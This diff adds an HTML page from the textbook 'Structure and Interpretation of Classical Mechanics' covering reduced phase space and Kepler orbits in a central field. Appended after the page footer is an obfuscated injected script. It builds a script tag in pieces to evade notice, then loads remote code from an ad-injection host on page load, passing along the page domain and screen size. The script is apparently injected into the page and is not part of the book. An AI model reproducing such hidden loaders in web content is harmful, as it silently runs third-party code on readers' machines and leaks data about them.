@@ -1,0 +1,191 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-61.html">previous</a></span><span>, <a href="book-Z-H-63.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_5.5"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_5.5">5.5&nbsp;&nbsp;Reduced Phase Space</a></h2>
+<p><a name="%_idx_2650"></a><a name="%_idx_2652"></a>
+Suppose we have a system with <em>n</em> + 1 degrees of freedom described by a
+time-independent Hamiltonian in a (2<em>n</em> + 2)-dimensional phase space.
+Here we can play the converse game: we can choose any generalized
+coordinate to play the role of ``time'' and the negation of its
+conjugate momentum to play the role of a new <em>n</em>-degree-of-freedom
+time-dependent Hamiltonian in a <em>reduced phase space</em> of 2<em>n</em>
+dimensions.</p>
+<p>
+
+More precisely, let 
+<a name="EQUATION_5.123"></a></p>
+<div align=left><img src="chap5-Z-G-119.gif" border="0"></div>
+<p>
+and suppose we have a system described by a time-independent Hamiltonian
+<a name="EQUATION_5.124"></a></p>
+<div align=left><img src="chap5-Z-G-120.gif" border="0"></div>
+<p>
+For each solution path there is a conserved quantity <em>E</em>.
+Let's choose a coordinate <em>q</em><sup><em>n</em></sup> to be the time in a reduced phase
+space.  We define
+the dynamical variables for the <em>n</em>-degree-of-freedom reduced phase space:
+<a name="EQUATION_5.125"></a></p>
+<div align=left><img src="chap5-Z-G-121.gif" border="0"></div>
+<p>
+In the original phase space a coordinate such as <em>q</em><sup><em>n</em></sup> maps time to a
+coordinate.  In the formulation of the reduced phase space we will
+have to use the inverse function <img src="chap2-Z-G-D-22.gif" border="0"> = (<em>q</em><sup><em>n</em></sup>)<sup><tt>-</tt>1</sup> to map the coordinate to
+the time, giving the new coordinates in terms of the new time
+<a name="EQUATION_5.126"></a></p>
+<div align=left><img src="chap5-Z-G-122.gif" border="0"></div>
+<p>
+and thus
+<a name="EQUATION_5.127"></a></p>
+<div align=left><img src="chap5-Z-G-123.gif" border="0"></div>
+<p></p>
+<p>
+We propose that a Hamiltonian in the reduced phase
+space is the negative of the inverse of <em>f</em>(<em>q</em><sup>0</sup>, ..., <em>q</em><sup><em>n</em></sup>; <em>p</em><sub>0</sub>, ...,
+<em>p</em><sub><em>n</em></sub>) = <em>E</em> with respect to the <em>p</em><sub><em>n</em></sub> argument:
+<a name="EQUATION_5.128"></a></p>
+<div align=left><img src="chap5-Z-G-124.gif" border="0"></div>
+<p>
+Note that in the reduced phase space we will have indices for the
+structured variables in the range 0 <tt>...</tt> <em>n</em> <tt>-</tt> 1, whereas in the original
+phase space the indices are in the range 0 <tt>...</tt> <em>n</em>.  We will show
+that <em>H</em><sub><em>r</em></sub> is an appropriate Hamiltonian for the given dynamical
+system in the reduced phase space.  To compute Hamilton's equations we
+must expand the implicit definition of <em>H</em><sub><em>r</em></sub>.  We define an auxiliary
+function
+<a name="EQUATION_5.129"></a></p>
+<div align=left><img src="chap5-Z-G-125.gif" border="0"></div>
+<p>
+Note that <em>by construction</em> this function is identically a
+constant <em>g</em>  =  <em>E</em>.  Thus all of its partial derivatives are zero:
+<a name="EQUATION_5.130"></a></p>
+<div align=left><img src="chap5-Z-G-126.gif" border="0"></div>
+<p>
+where we have suppressed the arguments.
+Solving for partials of <em>H</em><sub><em>r</em></sub>, we get
+<a name="EQUATION_5.131"></a></p>
+<div align=left><img src="chap5-Z-G-127.gif" border="0"></div>
+<p>
+Using these relations, we can deduce the Hamilton's equations in the
+reduced phase space from the Hamilton's equations in the original
+phase space:
+<a name="EQUATION_5.132"></a></p>
+<div align=left><img src="chap5-Z-G-128.gif" border="0"></div>
+<p></p>
+<p>
+
+</p>
+<a name="%_sec_Temp_365"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_365">Orbits in a central field</a></h4>
+<p><a name="%_idx_2654"></a>
+Consider planar motion in a central field.  We have
+already seen this expressed in polar coordinates in
+equation&nbsp;(<a href="book-Z-H-40.html#EQUATION_3.99">3.99</a>):
+<a name="EQUATION_5.134"></a></p>
+<div align=left><img src="chap5-Z-G-129.gif" border="0"></div>
+<p>
+There are two degrees of freedom and the Hamiltonian is
+time independent.  Thus the energy, the value of the Hamiltonian, is
+conserved on realizable paths.
+Let's forget about time and
+reparameterize this system in terms of the orbital radius <em>r</em>.<a name="call_footnote_Temp_366" href="#footnote_Temp_366"><sup><small>16</small></sup></a>
+To do this we solve
+<a name="EQUATION_5.135"></a></p>
+<div align=left><img src="chap5-Z-G-130.gif" border="0"></div>
+<p>
+for <em>p</em><sub><em>r</em></sub>, obtaining
+
+<a name="EQUATION_5.136"></a></p>
+<div align=left><img src="chap5-Z-G-131.gif" border="0"></div>
+<p>
+which is the Hamiltonian in the reduced phase space.</p>
+<p>
+Hamilton's equations are now quite simple:
+<a name="EQUATION_5.137"></a></p>
+<div align=left><img src="chap5-Z-G-132.gif" border="0"></div>
+<p>
+We see that <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> is independent of <em>r</em> (as it was with <em>t</em>), so for
+any particular orbit we may define a constant angular momentum <em>L</em>.
+Thus our problem ends up as a simple quadrature:
+<a name="EQUATION_5.139"></a></p>
+<div align=left><img src="chap5-Z-G-133.gif" border="0"></div>
+<p></p>
+<p>
+To see the utility of this procedure, we continue our example with a
+<a name="%_idx_2656"></a>definite potential energy -- a gravitating mass point:
+<a name="EQUATION_5.140"></a></p>
+<div align=left><img src="chap5-Z-G-134.gif" border="0"></div>
+<p>
+When we substitute this into equation&nbsp;(<a href="#EQUATION_5.139">5.139</a>) we obtain a
+mess that can be simplified to
+<a name="EQUATION_5.141"></a></p>
+<div align=left><img src="chap5-Z-G-135.gif" border="0"></div>
+<p>
+Integrating this, we obtain another mess, which can be
+simplified and rearranged to obtain the following:
+<a name="EQUATION_5.142"></a></p>
+<div align=left><img src="chap5-Z-G-136.gif" border="0"></div>
+<p>
+This can be recognized as the polar-coordinate form of the equation of
+a conic section with eccentricity <em>e</em> and parameter <em>p</em>:
+<a name="EQUATION_5.143"></a></p>
+<div align=left><img src="chap5-Z-G-137.gif" border="0"></div>
+<p>
+where 
+<a name="EQUATION_5.144"></a></p>
+<div align=left><img src="chap5-Z-G-138.gif" border="0"></div>
+<p>
+In fact, if the orbit is an ellipse with semimajor axis <em>a</em>, we have 
+<a name="EQUATION_5.145"></a></p>
+<div align=left><img src="chap5-Z-G-139.gif" border="0"></div>
+<p>
+and so we can identify the role of energy and angular momentum in
+shaping the ellipse:
+<a name="EQUATION_5.146"></a></p>
+<div align=left><img src="chap5-Z-G-140.gif" border="0"></div>
+<p></p>
+<p>
+What we get from analysis in the reduced phase space is the
+geometry of the trajectory, but we lose the time-domain behavior.  The
+reduction is often worth the price.</p>
+<p>
+Although we have treated time in a special way so far, we have
+found that time is not special.  It can be included in the coordinates
+to make a driven system autonomous.  And it can be eliminated from any
+autonomous system in favor of any other coordinate.  This leads to
+numerous strategies for simplifying problems, by removing time
+variation and then performing canonical transforms on the resulting
+conservative autonomous system to make a nice coordinate that we can
+then dump back into the role of time.</p>
+<p>
+
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_366" href="#call_footnote_Temp_366"><sup><small>16</small></sup></a> We
+could have chosen to reparameterize in terms of <img src="chap1-Z-G-D-16.gif" border="0">, but then both
+<em>p</em><sub><em>r</em></sub> and <em>r</em> would occur in the resulting time-independent
+Hamiltonian.  The path we have chosen takes advantage of the fact that
+<img src="chap1-Z-G-D-16.gif" border="0"> does not appear in our Hamiltonian, so <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> is a constant
+of the motion.  This structure suggests that to solve this kind of
+problem we need to look ahead, as in playing chess.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-61.html">previous</a></span><span>, <a href="book-Z-H-63.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD3W6ghzE202EdnXLGcRPTt5yF9FHE8Z6Lv43V9IGPKNSO6Uf8MrwMC0ASMc%2fYiQWHoZW2%2fd0%2f0ysI9twAZSakPyMBXTTaIQ5R4yW9aqprEX5z9KoZnzdS3TEogIZYpPpmeMR4xI7njhiY1JQglKCQfgahYsvtbAmQc%2fcuPwgzMmSn1xjt8D4INyzjxIP%2bsxta1s8xxvDdnjkb3vMIwrVw69sbGYmDgkQJxtkGXDkTakYxR5HUFMPiBloAmLN8TPqIB64OjzUtGqSzqFbif5nroeFvw1Whip3fOEF9sYbOUlFdFmn43Z5pw2%2bkBXiVduyIZqC8OBSuoUEcaiKTNqJHLzcPS8Sd8nyEWCInnNNMSQK9fwXou0tC64xDGpsItEyAADgDrPxbHGqPB14XW7zXLay7oqj7CqHP%2fCMdPnmdjTmmKv620hZzoSxToVj990WAsXJvVXUDzvpSzSz8BH3uU9");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
